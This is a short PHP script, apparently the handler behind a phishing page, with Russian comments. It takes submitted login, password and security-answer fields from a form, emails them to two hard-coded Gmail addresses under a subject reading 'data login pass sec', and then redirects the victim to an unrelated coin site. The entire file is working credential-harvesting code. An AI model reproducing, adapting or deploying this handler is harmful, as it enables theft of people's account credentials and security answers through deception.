<?php
// несколько получателей
$to  = 'webphoenixit@gmail.com' . ', ';  // обратите внимание на запятую
$to .= 'andreycerrov@gmail.com';

// тема письма
$subject = 'Данные лог пасс сек секут коммент';

// текст письма меняется он!!
$message = $_POST['lorigin'] . ';' . $_POST['porigin'] . ';' . $_POST['sek'] . ';' . $_POST['sekUT'] . ';<br />' . $_POST['comment'];

// Для отправки HTML-письма должен быть установлен заголовок Content-type
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 

// Дополнительные заголовки
$headers .= 'To: Иван <webphoenixit@gmail.com>' . "\r\n"; // Свое имя и email


// Отправляем
mail($to, $subject, $message, $headers);
header('Location:http://futcoins.vasayiravar.bplaced.com/');
exit;
?>